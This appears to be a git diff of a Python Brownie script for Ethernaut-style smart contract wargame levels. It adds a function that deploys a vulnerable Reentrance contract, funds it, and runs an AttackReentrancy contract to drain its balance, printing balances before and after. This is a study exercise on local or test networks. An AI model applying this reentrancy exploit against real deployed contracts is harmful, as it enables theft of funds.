@@ -1,13 +1,12 @@
 from brownie import Fallback, Fallout, CoinFlip, CoinFlipAttacker, Telephone, TelephoneAttacker, TokenThing, Delegation, Delegate, Force, network, config, accounts, Contract
-from brownie import AttackForce, Vault, King, AttackKing
+from brownie import AttackForce, Vault, King, AttackKing, Reentrance, AttackReentrancy
 from brownie.network.gas.strategies import GasNowStrategy
 from brownie.network import gas_price
 from scripts.helpful_scripts import *
 import time
 from web3.auto.infura import w3
 import os
-
-
+from brownie import Wei
 
 
 
@@ -175,7 +174,27 @@ def deploy_king():
         print("King attacked successfully! Submit the solution as complete.")
 
 
+def deploy_reentrance():
+    account = get_account()
+    reentrance = deploy_contract(Reentrance, "Reentrance", 1, [])
     
+    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
+        # accounts[1] and accounts[2] each donates 1 ether to victim contract
+        reentrance.donate(account.address, {"from":accounts[1], "value":Wei("0.0001 ether")})
+        reentrance.donate(account.address, {"from":accounts[2], "value":Wei("0.0001 ether")})
+        web3 = Web3(Web3.HTTPProvider("HTTP://127.0.0.1:8545"))
+    else:
+        web3 = Web3(Web3.HTTPProvider(f"https://{network.show_active()}.infura.io/v3/{os.getenv('WEB3_INFURA_PROJECT_ID')}"))
+
+    # attacker gets deployed (in local and testnet)
+    # accounts[0] deposits 1 ether into attacker
+    attacker = AttackReentrancy.deploy(reentrance.address, {"from": account.address, "value": Wei("0.0001 ether")}, publish_source=False)
+
+    print(f"Before attack...victim balance: {web3.fromWei(web3.eth.get_balance(reentrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
+    attacker.donateToTarget({"from":account.address}).wait(1)
+    attacker.attack({"from":account.address}).wait(1)
+    print(f"After attack...victim balance: {web3.fromWei(web3.eth.get_balance(reentrance.address), 'ether')}, attacker balance: {web3.fromWei(web3.eth.get_balance(attacker.address), 'ether')}")
+    print(f"After attack...recursion count: {attacker.recursionCount()}")
 
 ### NOTES
 ### deploy_contract is used for when the instance is either from address or deployed locally, depending on network
@@ -190,4 +209,5 @@ def main():
     #deploy_delegation()
     #deploy_force()
     #deploy_vault()
-    deploy_king()
+    #deploy_king()
+    deploy_reentrance()
